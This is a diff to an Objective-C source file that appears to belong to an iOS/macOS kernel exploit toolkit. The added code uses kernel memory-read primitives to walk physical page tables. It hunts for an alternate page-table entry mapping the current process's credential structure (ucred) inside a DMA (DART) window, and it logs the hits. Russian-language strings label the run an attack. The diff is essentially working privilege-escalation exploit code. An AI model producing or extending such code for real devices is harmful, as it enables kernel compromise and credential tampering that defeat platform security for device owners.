@@ -3050,7 +3050,46 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         }
     }
 
-    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM] выше\n"];
+    // ---- C3 HUNT 2.0.80: второй PTE на ucred в DART-окне ----
+    // Текущий PTE в low RAM (вне DMA). Ищем дубль-таблицу в high PA.
+    [r appendString:@"=== C3 HUNT 2.0.80: alt-PTE for ucred in DART window ===\n"];
+    {
+        uint64_t ucPage = curUcred & ~0x3fffULL;
+        uint64_t ucPA = kvtophys(ucPage);
+        uint64_t wB = kconstant(physBase), wS = kconstant(physSize);
+        uint64_t dartLo = wB + 0x40000000ULL;   // ~1GB, как DART-GATE
+        kpNote(r, [NSString stringWithFormat:@"  [C3] ucredVA=%#llx PA=%#llx dart=[%#llx..%#llx)",
+                  (unsigned long long)ucPage, (unsigned long long)ucPA,
+                  (unsigned long long)dartLo, (unsigned long long)(wB + wS)]);
+        uint32_t nAlt = 0, nScanned = 0, nInWindow = 0;
+        if (ucPA) {
+            for (uint64_t pa = wB; pa < wB + wS; pa += 0x4000) {
+                int t = kpFrameTypeOf(pa);
+                if (t != 0x21 && t != 0x15 && t != 0x0b) continue;
+                uint64_t al = phystokv(pa);
+                if (!al) continue;
+                nScanned++;
+                BOOL inWin = (pa >= dartLo);
+                if (inWin) nInWindow++;
+                for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
+                    uint64_t q = early_kread64(al + o);
+                    if ((q & 3) != 3) continue;
+                    uint64_t oa = q & 0x0000ffffffffc000ULL;
+                    if (oa == (ucPA & ~0x3fffULL)) {
+                        nAlt++;
+                        kpNote(r, [NSString stringWithFormat:@"  [C3] ★ ALT-PTE va=%#llx off=+x%x pa=%#llx t=%d inDART=%d val=%#018llx",
+                                  (unsigned long long)al, o, (unsigned long long)pa, t, inWin ? 1 : 0,
+                                  (unsigned long long)q]);
+                    }
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [C3] scanned=%u inDART=%u altPTEs=%u", nScanned, nInWindow, nAlt]);
+        if (nAlt == 0)
+            kpNote(r, @"  [C3] второго маппинга нет — ucred виден только через low-RAM PTE");
+    }
+
+    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3] выше\n"];
     return r;
 
 }
